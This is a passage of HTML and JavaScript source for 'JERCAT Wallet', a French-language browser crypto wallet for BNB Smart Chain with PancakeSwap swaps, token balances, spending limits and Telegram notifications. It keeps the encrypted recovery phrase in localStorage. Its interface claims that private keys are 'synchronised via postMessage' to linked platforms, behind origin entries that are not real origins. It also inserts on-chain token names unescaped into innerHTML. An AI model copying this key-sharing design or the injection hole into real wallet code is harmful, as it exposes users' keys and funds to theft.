<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîê JERCAT Wallet - Complet + Auto-Connect</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
            min-height: 100vh;
            padding: 20px;
            color: #e2e8f0;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            background: linear-gradient(to bottom right, #1e293b, #0f172a);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid #334155;
        }

        h1 {
            text-align: center;
            background: linear-gradient(135deg, #f59e0b 0%, #f97316 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            font-size: 32px;
            font-weight: 900;
        }

        .subtitle {
            text-align: center;
            color: #94a3b8;
            margin-bottom: 30px;
            font-size: 14px;
            font-weight: 600;
        }

        .nav-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            border-bottom: 2px solid #334155;
            overflow-x: auto;
            padding-bottom: 10px;
        }

        .nav-tab {
            padding: 12px 20px;
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 8px 8px 0 0;
            color: #94a3b8;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 700;
            font-size: 14px;
            white-space: nowrap;
            flex-shrink: 0;
        }

        .nav-tab:hover {
            background: #1e293b;
            border-color: #f59e0b;
        }

        .nav-tab.active {
            background: linear-gradient(135deg, #f59e0b 0%, #f97316 100%);
            color: #000;
            border-color: #f59e0b;
        }

        .page {
            display: none;
        }

        .page.active {
            display: block;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .section {
            margin-bottom: 25px;
            padding: 20px;
            background: linear-gradient(to bottom right, #1e293b, #0f172a);
            border-radius: 12px;
            border: 1px solid #334155;
        }

        .section h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #f59e0b;
            font-weight: 700;
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #f59e0b 0%, #f97316 100%);
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(245, 158, 11, 0.4);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        button.danger {
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            color: white;
        }

        button.success {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            color: white;
        }

        button.secondary {
            background: #334155;
            color: #e2e8f0;
        }

        button.dex-button {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            color: white;
        }

        input, select {
            width: 100%;
            padding: 12px;
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 10px;
            color: #e2e8f0;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #f59e0b;
        }

        .warning {
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            border: 2px solid #f59e0b;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #78350f;
            font-weight: 600;
        }

        .info-box {
            background: #0f172a;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            word-break: break-all;
            font-size: 14px;
            border: 2px solid #334155;
        }

        .info-box label {
            font-weight: 700;
            color: #f59e0b;
            display: block;
            margin-bottom: 8px;
        }

        .hidden { display: none; }

        .balance {
            font-size: 36px;
            font-weight: 900;
            background: linear-gradient(135deg, #f59e0b 0%, #f97316 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            margin: 20px 0;
        }

        .token-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .token-card {
            position: relative;
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
            border: 2px solid #334155;
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            transition: all 0.2s;
            cursor: pointer;
        }

        .token-card:hover {
            border-color: #f59e0b;
            transform: translateY(-2px);
        }

        .token-card.selected {
            border-color: #10b981;
            background: linear-gradient(135deg, #1e293b 0%, #0f4c3a 100%);
        }

        .log-entry {
            background: #0f172a;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 8px;
            border-left: 4px solid #f59e0b;
            font-size: 13px;
        }

        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 700;
            margin-left: 10px;
        }

        .badge-success { background: #10b981; color: white; }
        .badge-warning { background: #f59e0b; color: white; }
        .badge-info { background: #0088cc; color: white; }

        .stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 20px;
        }

        .stat-box {
            background: #0f172a;
            padding: 15px;
            border-radius: 8px;
            border: 2px solid #334155;
        }

        .stat-label {
            font-size: 12px;
            color: #94a3b8;
            margin-bottom: 5px;
            font-weight: 600;
        }

        .stat-value {
            font-size: 20px;
            font-weight: 900;
            color: #f59e0b;
        }

        .error { 
            background: linear-gradient(135deg, #fecaca 0%, #fca5a5 100%); 
            border: 2px solid #dc2626; 
            padding: 15px; 
            border-radius: 8px; 
            margin-top: 15px; 
            color: #7f1d1d; 
            font-weight: 600; 
        }

        .success-msg { 
            background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%); 
            border: 2px solid #10b981; 
            padding: 15px; 
            border-radius: 8px; 
            margin-top: 15px; 
            color: #064e3b; 
            font-weight: 600; 
        }

        .swap-container {
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .swap-input-group {
            background: #1e293b;
            border: 2px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }

        .swap-input-group label {
            font-size: 12px;
            color: #94a3b8;
            margin-bottom: 8px;
            display: block;
            font-weight: 600;
        }

        .swap-input-row {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .swap-input-row input {
            flex: 1;
            margin: 0;
        }

        .swap-input-row select {
            width: 120px;
            margin: 0;
        }

        .swap-arrow {
            text-align: center;
            font-size: 24px;
            color: #f59e0b;
            margin: 10px 0;
        }

        .price-info {
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 8px;
            padding: 12px;
            margin: 15px 0;
            font-size: 13px;
        }

        .price-info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            color: #94a3b8;
        }

        .price-info-row:last-child {
            margin-bottom: 0;
        }

        .price-info-row span:last-child {
            color: #f59e0b;
            font-weight: 700;
        }

        .slippage-selector {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }

        .slippage-option {
            flex: 1;
            padding: 10px;
            background: #1e293b;
            border: 2px solid #334155;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 700;
            font-size: 14px;
        }

        .slippage-option:hover {
            border-color: #f59e0b;
        }

        .slippage-option.active {
            background: #f59e0b;
            color: #000;
            border-color: #f59e0b;
        }

        .platform-links {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 20px;
        }

        .platform-card {
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
            border: 2px solid #334155;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
            cursor: pointer;
        }

        .platform-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3);
        }

        .platform-icon {
            font-size: 48px;
            margin-bottom: 10px;
        }

        .platform-name {
            font-size: 18px;
            font-weight: 700;
            color: #f59e0b;
            margin-bottom: 5px;
        }

        .platform-desc {
            font-size: 12px;
            color: #94a3b8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ü§ñ JERCAT Wallet COMPLET</h1>
        <p class="subtitle">‚úÖ Secure Multi-Page + Auto-Connect Trading Bot + DEX</p>

        <!-- √âcran de connexion -->
        <div id="loginScreen">
            <div class="section">
                <h2>üîì Connexion</h2>
                <input type="password" id="loginPassword" placeholder="Mot de passe">
                <button onclick="login()">D√©verrouiller</button>
                <button onclick="showCreateScreen()" class="secondary">Cr√©er un wallet</button>
            </div>
        </div>

        <!-- √âcran de cr√©ation -->
        <div id="createScreen" class="hidden">
            <div class="section">
                <h2>‚ú® Cr√©er un wallet s√©curis√©</h2>
                <input type="password" id="newPassword" placeholder="Mot de passe (min 8 caract√®res)">
                <input type="password" id="confirmPassword" placeholder="Confirmer">
                <input type="text" id="importPhrase" placeholder="(Optionnel) Phrase de r√©cup√©ration">
                <button onclick="createSecureWallet()">Cr√©er le wallet</button>
                <button onclick="showLoginScreen()" class="secondary">Retour</button>
                <div id="createMessage"></div>
                
                <div id="newWalletInfo" class="hidden">
                    <div class="info-box">
                        <label>‚ö†Ô∏è SAUVEGARDEZ CETTE PHRASE :</label>
                        <div id="displayMnemonic" style="font-weight: bold; color: #f59e0b;"></div>
                    </div>
                    <button onclick="confirmAndContinue()" class="success">‚úÖ J'ai sauvegard√©</button>
                </div>
            </div>
        </div>

        <!-- Interface principale avec navigation -->
        <div id="mainScreen" class="hidden">
            <!-- Navigation par onglets -->
            <div class="nav-tabs">
                <div class="nav-tab active" onclick="showPage('dashboard')">üìä Dashboard</div>
                <div class="nav-tab" onclick="showPage('platforms')">üöÄ Plateformes</div>
                <div class="nav-tab" onclick="showPage('swap')">üí± Swap PCS</div>
                <div class="nav-tab" onclick="showPage('tokens')">ü™ô Tokens</div>
                <div class="nav-tab" onclick="showPage('security')">üõ°Ô∏è S√©curit√©</div>
                <div class="nav-tab" onclick="showPage('settings')">‚öôÔ∏è Param√®tres</div>
            </div>

            <!-- PAGE 1: DASHBOARD -->
            <div id="page-dashboard" class="page active">
                <div class="section">
                    <h2>üìä Mon Wallet</h2>
                    <div class="info-box">
                        <label>Adresse :</label>
                        <div id="walletAddress" style="color: #94a3b8; font-family: monospace;"></div>
                    </div>
                    <div class="balance" id="balance">0.0000 BNB</div>
                    <button onclick="refreshBalance()">üîÑ Actualiser</button>
                </div>

                <div class="section">
                    <h2>üìà Statistiques</h2>
                    <div class="stats">
                        <div class="stat-box">
                            <div class="stat-label">Total Swaps</div>
                            <div class="stat-value" id="totalSwaps">0</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-label">Volume 24h</div>
                            <div class="stat-value" id="volume24h">0 BNB</div>
                        </div>
                    </div>
                </div>

                <div class="section">
                    <h2>üìã Historique r√©cent</h2>
                    <div id="transactionLogs"></div>
                </div>
            </div>

            <!-- PAGE 2: PLATEFORMES JERCAT -->
            <div id="page-platforms" class="page">
                <div class="section">
                    <h2>üöÄ √âcosyst√®me JERCAT</h2>
                    <p style="color: #94a3b8; margin-bottom: 20px; text-align: center;">
                        Connexion automatique et synchronisation compl√®te des donn√©es
                    </p>
                    
                    <div class="platform-links">
                        <div class="platform-card" onclick="openJercatDEX()">
                            <div class="platform-icon">üí±</div>
                            <div class="platform-name">JERCAT DEX</div>
                            <div class="platform-desc">Trading & Swap d√©centralis√©</div>
                            <div style="margin-top: 10px; padding: 8px; background: #10b981; border-radius: 6px; font-size: 11px; color: white; font-weight: 700;">
                                ‚úÖ Auto-Connect + Sync
                            </div>
                        </div>

                        <div class="platform-card" onclick="openBotAllIn()">
                            <div class="platform-icon">‚ö°</div>
                            <div class="platform-name">Bot All-In</div>
                            <div class="platform-desc">Bot de trading ultra-performant</div>
                            <div style="margin-top: 10px; padding: 8px; background: #10b981; border-radius: 6px; font-size: 11px; color: white; font-weight: 700;">
                                ‚úÖ Auto-Connect + Sync
                            </div>
                        </div>
                    </div>
                </div>

                <div class="section">
                    <h2>‚ÑπÔ∏è Informations</h2>
                    <div style="background: #0f172a; padding: 15px; border-radius: 8px; border: 2px solid #334155;">
                        <p style="color: #94a3b8; font-size: 13px; margin-bottom: 10px;">
                            <strong style="color: #f59e0b;">üîê S√©curit√© :</strong><br>
                            Toutes les connexions utilisent votre wallet principal. Vos cl√©s priv√©es sont synchronis√©es de mani√®re s√©curis√©e via postMessage.
                        </p>
                        <p style="color: #94a3b8; font-size: 13px;">
                            <strong style="color: #f59e0b;">‚ö° Synchronisation :</strong><br>
                            Balance, tokens, historique et param√®tres sont automatiquement synchronis√©s entre toutes les plateformes.
                        </p>
                    </div>
                </div>
            </div>

            <!-- PAGE 3: SWAP PANCAKESWAP -->
            <div id="page-swap" class="page">
                <div class="section">
                    <h2>üí± Swap sur PancakeSwap</h2>
                    
                    <div class="swap-container">
                        <!-- FROM -->
                        <div class="swap-input-group">
                            <label>Tu vends</label>
                            <div class="swap-input-row">
                                <input type="number" id="swapFromAmount" placeholder="0.0" step="0.0001" oninput="calculateSwapOutput()">
                                <select id="swapFromToken" onchange="updateSwapTokens()">
                                    <option value="BNB">BNB</option>
                                </select>
                            </div>
                            <div style="margin-top: 8px; font-size: 12px; color: #64748b;" id="fromBalance">Balance: 0.0</div>
                        </div>

                        <!-- ARROW -->
                        <div class="swap-arrow">‚¨áÔ∏è</div>

                        <!-- TO -->
                        <div class="swap-input-group">
                            <label>Tu re√ßois (estim√©)</label>
                            <div class="swap-input-row">
                                <input type="number" id="swapToAmount" placeholder="0.0" readonly>
                                <select id="swapToToken" onchange="calculateSwapOutput()">
                                    <option value="">Choisir...</option>
                                </select>
                            </div>
                            <div style="margin-top: 8px; font-size: 12px; color: #64748b;" id="toBalance">Balance: 0.0</div>
                        </div>

                        <!-- SLIPPAGE -->
                        <div style="margin-top: 20px;">
                            <label style="font-size: 12px; color: #94a3b8; margin-bottom: 8px; display: block; font-weight: 600;">
                                Slippage Tol√©rance
                            </label>
                            <div class="slippage-selector">
                                <div class="slippage-option active" onclick="setSlippage(0.5)">0.5%</div>
                                <div class="slippage-option" onclick="setSlippage(1)">1%</div>
                                <div class="slippage-option" onclick="setSlippage(3)">3%</div>
                                <div class="slippage-option" onclick="setSlippage(5)">5%</div>
                            </div>
                        </div>

                        <!-- PRICE INFO -->
                        <div class="price-info" id="priceInfo">
                            <div class="price-info-row">
                                <span>Prix</span>
                                <span id="swapPrice">-</span>
                            </div>
                            <div class="price-info-row">
                                <span>Minimum re√ßu</span>
                                <span id="minReceived">-</span>
                            </div>
                            <div class="price-info-row">
                                <span>Impact sur le prix</span>
                                <span id="priceImpact">-</span>
                            </div>
                        </div>
                    </div>

                    <button onclick="executeSwap()" class="success" id="swapButton">
                        üí± Swap
                    </button>
                    <div id="swapMessage"></div>
                </div>

                <div class="section">
                    <h2>üìä Historique Swaps</h2>
                    <div id="swapHistory"></div>
                </div>
            </div>

            <!-- PAGE 4: TOKENS -->
            <div id="page-tokens" class="page">
                <div class="section">
                    <h2>ü™ô Mes Tokens</h2>
                    <div class="token-grid" id="tokenBalances">
                        <div style="text-align: center; color: #64748b; padding: 20px;">
                            Chargement...
                        </div>
                    </div>
                    <button onclick="refreshAllTokens()" class="secondary">üîÑ Rafra√Æchir</button>
                </div>

                <div class="section">
                    <h2>‚ûï Ajouter un Token</h2>
                    <input type="text" id="tokenAddressInput" placeholder="Adresse du contrat (0x...)">
                    <button onclick="addTokenByAddress()">üîç Rechercher et ajouter</button>
                    <div id="tokenSearchResult"></div>
                </div>
            </div>

            <!-- PAGE 5: S√âCURIT√â -->
            <div id="page-security" class="page">
                <div class="section">
                    <h2>ü§ñ Telegram Bot</h2>
                    <input type="text" id="botTokenInput" placeholder="Bot Token (1234567890:ABC...)">
                    <button onclick="saveBotToken()">üíæ Enregistrer Bot Token</button>
                    
                    <div id="botTokenStatus" class="info-box" style="margin-top: 15px;">
                        <label>ü§ñ Statut :</label>
                        <div id="botTokenStatusText" style="color: #64748b;">Non configur√©</div>
                    </div>

                    <input type="text" id="newTelegramId" placeholder="Chat ID (123456789)" style="margin-top: 15px;">
                    <button onclick="updateTelegramId()">üíæ Enregistrer Chat ID</button>
                    
                    <div id="telegramStatus" class="info-box" style="margin-top: 15px;">
                        <label>üì± Chat ID :</label>
                        <div id="telegramStatusText" style="color: #64748b;">Non configur√©</div>
                    </div>

                    <button onclick="testTelegram()" class="secondary" style="margin-top: 15px;">üß™ Tester Telegram</button>
                </div>

                <div class="section">
                    <h2>üìã Liste Blanche</h2>
                    <div id="whitelistDisplay" style="margin-bottom: 15px;"></div>
                    <input type="text" id="newWhitelistAddress" placeholder="0x... Adresse √† autoriser">
                    <button onclick="addToWhitelist()">‚ûï Ajouter</button>
                </div>
            </div>

            <!-- PAGE 6: PARAM√àTRES -->
            <div id="page-settings" class="page">
                <div class="section">
                    <h2>‚öôÔ∏è Limites de S√©curit√©</h2>
                    <input type="number" id="newMaxTx" placeholder="Max par transaction (BNB)" step="0.1">
                    <input type="number" id="newDailyLimit" placeholder="Limite quotidienne (BNB)" step="0.1">
                    <button onclick="updateLimits()">üíæ Mettre √† jour</button>
                    
                    <div class="stats" style="margin-top: 20px;">
                        <div class="stat-box">
                            <div class="stat-label">Max par transaction</div>
                            <div class="stat-value" id="maxPerTx">1.0 BNB</div>
                        </div>
                        <div class="stat-box">
                            <div class="stat-label">Limite quotidienne</div>
                            <div class="stat-value" id="dailyLimit">10.0 BNB</div>
                        </div>
                    </div>
                </div>

                <div class="section">
                    <h2>üö® Actions</h2>
                    <button onclick="logout()" class="secondary">üîí Verrouiller le Wallet</button>
                    <button onclick="clearTelegramConfig()" class="danger">üóëÔ∏è Supprimer config Telegram</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const BSC_RPC = "https://bsc-dataseed.binance.org/";
        let provider = new ethers.JsonRpcProvider(BSC_RPC);
        let wallet = null;
        let TELEGRAM_BOT_TOKEN = localStorage.getItem('telegramBotToken') || '';

        // PANCAKESWAP CONFIG
        const PANCAKESWAP_ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
        const WBNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
        
        const ROUTER_ABI = [
            "function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)",
            "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)",
            "function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
            "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)"
        ];

        const ERC20_ABI = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function name() view returns (string)",
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)"
        ];

        let swapConfig = {
            slippage: 0.5,
            deadline: 20,
            swapHistory: []
        };

        let securityConfig = {
            maxPerTransaction: 1.0,
            dailyLimit: 10.0,
            dailySpent: 0.0,
            lastResetDate: new Date().toDateString(),
            telegramChatId: '',
            whitelist: ["0x10ED43C718714eb63d5aA57B78B54704E256024E"],
            transactionLogs: [],
            autoApprovedCount: 0,
            knownTokens: [
                { address: '0x197CF8951d93325A9333857Ee5330daF7aC4bcCF', symbol: 'JERCAT', name: 'JERCAT Token', trusted: true },
                { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB', name: 'Wrapped BNB', trusted: true },
                { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', name: 'Binance USD', trusted: true },
                { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', name: 'Tether USD', trusted: true },
                { address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE', name: 'PancakeSwap', trusted: true }
            ],
            trustedOrigins: ['jercat-wallet', 'jercat-dex', 'jercat-bot', 'localhost']
        };

        // NAVIGATION
        function showPage(pageName) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
            
            document.getElementById('page-' + pageName).classList.add('active');
            event.target.classList.add('active');

            if (pageName === 'swap') {
                populateSwapTokens();
                updateSwapBalances();
            }
        }

        // SAUVEGARDE / CHARGEMENT
        function loadConfig() {
            const saved = localStorage.getItem('securityConfig');
            if (saved) {
                securityConfig = { ...securityConfig, ...JSON.parse(saved) };
            }

            const savedSwap = localStorage.getItem('swapConfig');
            if (savedSwap) {
                swapConfig = { ...swapConfig, ...JSON.parse(savedSwap) };
            }

            updateStatsDisplay();
            updateWhitelistDisplay();
            updateLogsDisplay();
            updateSwapHistoryDisplay();
        }

        function saveConfig() {
            localStorage.setItem('securityConfig', JSON.stringify(securityConfig));
            localStorage.setItem('swapConfig', JSON.stringify(swapConfig));
        }

        // WALLET MANAGEMENT
        function encryptAndSave(wallet, password) {
            const data = JSON.stringify({
                mnemonic: wallet.mnemonic.phrase,
                address: wallet.address
            });
            const encrypted = CryptoJS.AES.encrypt(data, password).toString();
            localStorage.setItem('encryptedWallet', encrypted);
        }

        function decryptWallet(password) {
            const encrypted = localStorage.getItem('encryptedWallet');
            if (!encrypted) return null;
            try {
                const decrypted = CryptoJS.AES.decrypt(encrypted, password).toString(CryptoJS.enc.Utf8);
                const data = JSON.parse(decrypted);
                return ethers.Wallet.fromPhrase(data.mnemonic);
            } catch (error) {
                return null;
            }
        }

        function createSecureWallet() {
            const password = document.getElementById('newPassword').value;
            const confirm = document.getElementById('confirmPassword').value;
            const importPhrase = document.getElementById('importPhrase').value.trim();
            const messageDiv = document.getElementById('createMessage');

            if (password.length < 8) {
                messageDiv.innerHTML = '<div class="error">‚ùå Mot de passe trop court.</div>';
                return;
            }

            if (password !== confirm) {
                messageDiv.innerHTML = '<div class="error">‚ùå Mots de passe diff√©rents.</div>';
                return;
            }

            try {
                wallet = importPhrase ? ethers.Wallet.fromPhrase(importPhrase) : ethers.Wallet.createRandom();
                encryptAndSave(wallet, password);
                saveConfig();

                document.getElementById('displayMnemonic').textContent = wallet.mnemonic.phrase;
                document.getElementById('newWalletInfo').classList.remove('hidden');
                messageDiv.innerHTML = '<div class="success-msg">‚úÖ Wallet cr√©√© !</div>';
            } catch (error) {
                messageDiv.innerHTML = '<div class="error">‚ùå ' + error.message + '</div>';
            }
        }

        function confirmAndContinue() {
            showMainScreen();
        }

        function login() {
            const password = document.getElementById('loginPassword').value;
            wallet = decryptWallet(password);

            if (wallet) {
                showMainScreen();
            } else {
                alert('‚ùå Mot de passe incorrect.');
            }
        }

        function showMainScreen() {
            wallet = wallet.connect(provider);
            document.getElementById('walletAddress').textContent = wallet.address;
            
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('createScreen').classList.add('hidden');
            document.getElementById('mainScreen').classList.remove('hidden');

            loadConfig();
            refreshBalance();
            updateBotTokenStatus();
            updateTelegramStatus();
        }

        function logout() {
            wallet = null;
            document.getElementById('mainScreen').classList.add('hidden');
            showLoginScreen();
        }

        function showLoginScreen() {
            document.getElementById('loginScreen').classList.remove('hidden');
            document.getElementById('createScreen').classList.add('hidden');
            document.getElementById('loginPassword').value = '';
        }

        function showCreateScreen() {
            document.getElementById('loginScreen').classList.add('hidden');
            document.getElementById('createScreen').classList.remove('hidden');
        }

        // BALANCE & TOKENS
        async function refreshBalance() {
            if (!wallet) return;
            try {
                const balance = await provider.getBalance(wallet.address);
                document.getElementById('balance').textContent = parseFloat(ethers.formatEther(balance)).toFixed(4) + ' BNB';
                await loadTokenBalances();
            } catch (error) {
                console.error(error);
            }
        }

        async function loadTokenBalances() {
            if (!wallet) return;

            const tokenBalancesDiv = document.getElementById('tokenBalances');
            tokenBalancesDiv.innerHTML = '<div style="text-align: center; color: #64748b; padding: 20px;">üîÑ Chargement...</div>';

            try {
                const userAddress = wallet.address;
                const balances = [];

                for (const token of securityConfig.knownTokens) {
                    try {
                        const tokenContract = new ethers.Contract(token.address, ERC20_ABI, provider);
                        
                        const [balance, decimals, symbol] = await Promise.all([
                            tokenContract.balanceOf(userAddress),
                            tokenContract.decimals().catch(() => 18),
                            tokenContract.symbol().catch(() => token.symbol)
                        ]);

                        const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));

                        balances.push({
                            symbol: symbol,
                            balance: formattedBalance,
                            trusted: token.trusted
                        });

                    } catch (error) {
                        console.error(`Erreur ${token.symbol}:`, error);
                    }
                }

                if (balances.length === 0) {
                    tokenBalancesDiv.innerHTML = '<div style="text-align: center; color: #64748b; padding: 20px;">Aucun token</div>';
                } else {
                    tokenBalancesDiv.innerHTML = '';
                    
                    balances.forEach(token => {
                        const balanceColor = token.balance > 0 ? '#10b981' : '#64748b';
                        const trustBadge = token.trusted ? '<div style="position: absolute; top: 8px; right: 8px; background: #10b981; color: white; padding: 2px 6px; border-radius: 4px; font-size: 9px;">‚úì</div>' : '';
                        
                        const tokenCard = document.createElement('div');
                        tokenCard.className = 'token-card';
                        tokenCard.innerHTML = `
                            ${trustBadge}
                            <div style="font-size: 24px; margin-bottom: 8px;">ü™ô</div>
                            <div style="color: #f59e0b; font-weight: 700; font-size: 16px; margin-bottom: 4px;">${token.symbol}</div>
                            <div style="color: ${balanceColor}; font-weight: 900; font-size: 20px;">
                                ${token.balance.toFixed(token.balance > 1 ? 2 : 6)}
                            </div>
                        `;
                        tokenBalancesDiv.appendChild(tokenCard);
                    });
                }

            } catch (error) {
                console.error('Erreur tokens:', error);
                tokenBalancesDiv.innerHTML = '<div style="text-align: center; color: #dc2626; padding: 20px;">‚ùå Erreur</div>';
            }
        }

        async function addTokenByAddress() {
            const address = document.getElementById('tokenAddressInput').value.trim();
            const resultDiv = document.getElementById('tokenSearchResult');

            if (!address || !ethers.isAddress(address)) {
                resultDiv.innerHTML = '<div class="error">‚ùå Adresse invalide</div>';
                return;
            }

            resultDiv.innerHTML = '<div class="info-box">üîç Recherche...</div>';

            try {
                const tokenContract = new ethers.Contract(address, ERC20_ABI, provider);
                
                const [symbol, name] = await Promise.all([
                    tokenContract.symbol(),
                    tokenContract.name()
                ]);

                const alreadyAdded = securityConfig.knownTokens.some(t => t.address.toLowerCase() === address.toLowerCase());

                if (alreadyAdded) {
                    resultDiv.innerHTML = '<div class="warning">‚ÑπÔ∏è Token d√©j√† ajout√©</div>';
                    await loadTokenBalances();
                    return;
                }

                resultDiv.innerHTML = `
                    <div class="success-msg">
                        ‚úÖ ${name} (${symbol}) trouv√© !<br>
                        <button onclick="confirmAddToken('${address}', '${symbol}', '${name}')" class="success" style="margin-top: 10px;">
                            Ajouter ${symbol}
                        </button>
                    </div>
                `;

            } catch (error) {
                resultDiv.innerHTML = '<div class="error">‚ùå ' + error.message + '</div>';
            }
        }

        function confirmAddToken(address, symbol, name) {
            securityConfig.knownTokens.push({
                address: address,
                symbol: symbol,
                name: name,
                trusted: true,
                addedAt: new Date().toISOString()
            });

            saveConfig();

            document.getElementById('tokenAddressInput').value = '';
            document.getElementById('tokenSearchResult').innerHTML = '<div class="success-msg">‚úÖ ' + symbol + ' ajout√© !</div>';

            loadTokenBalances();

            if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
                sendTelegramMessage(`ü™ô <b>Nouveau token ajout√©</b>\n\n‚úÖ ${name} (${symbol})\nüìç ${address}`);
            }
        }

        async function refreshAllTokens() {
            await loadTokenBalances();
        }

        // SWAP FUNCTIONS
        function populateSwapTokens() {
            const fromSelect = document.getElementById('swapFromToken');
            const toSelect = document.getElementById('swapToToken');

            fromSelect.innerHTML = '<option value="BNB">BNB</option>';
            toSelect.innerHTML = '<option value="">Choisir...</option>';

            securityConfig.knownTokens.forEach(token => {
                const option = `<option value="${token.address}">${token.symbol}</option>`;
                fromSelect.innerHTML += option;
                toSelect.innerHTML += option;
            });
        }

        async function updateSwapBalances() {
            if (!wallet) return;

            const fromToken = document.getElementById('swapFromToken').value;
            const toToken = document.getElementById('swapToToken').value;

            try {
                let fromBalance = '0.0';
                let toBalance = '0.0';

                if (fromToken === 'BNB') {
                    const balance = await provider.getBalance(wallet.address);
                    fromBalance = parseFloat(ethers.formatEther(balance)).toFixed(4);
                } else {
                    const contract = new ethers.Contract(fromToken, ERC20_ABI, provider);
                    const balance = await contract.balanceOf(wallet.address);
                    const decimals = await contract.decimals();
                    fromBalance = parseFloat(ethers.formatUnits(balance, decimals)).toFixed(6);
                }

                if (toToken && toToken !== 'BNB') {
                    const contract = new ethers.Contract(toToken, ERC20_ABI, provider);
                    const balance = await contract.balanceOf(wallet.address);
                    const decimals = await contract.decimals();
                    toBalance = parseFloat(ethers.formatUnits(balance, decimals)).toFixed(6);
                } else if (toToken === 'BNB') {
                    const balance = await provider.getBalance(wallet.address);
                    toBalance = parseFloat(ethers.formatEther(balance)).toFixed(4);
                }

                document.getElementById('fromBalance').textContent = `Balance: ${fromBalance}`;
                document.getElementById('toBalance').textContent = `Balance: ${toBalance}`;

            } catch (error) {
                console.error('Erreur balances:', error);
            }
        }

        function updateSwapTokens() {
            updateSwapBalances();
            calculateSwapOutput();
        }

        async function calculateSwapOutput() {
            const fromToken = document.getElementById('swapFromToken').value;
            const toToken = document.getElementById('swapToToken').value;
            const fromAmount = document.getElementById('swapFromAmount').value;

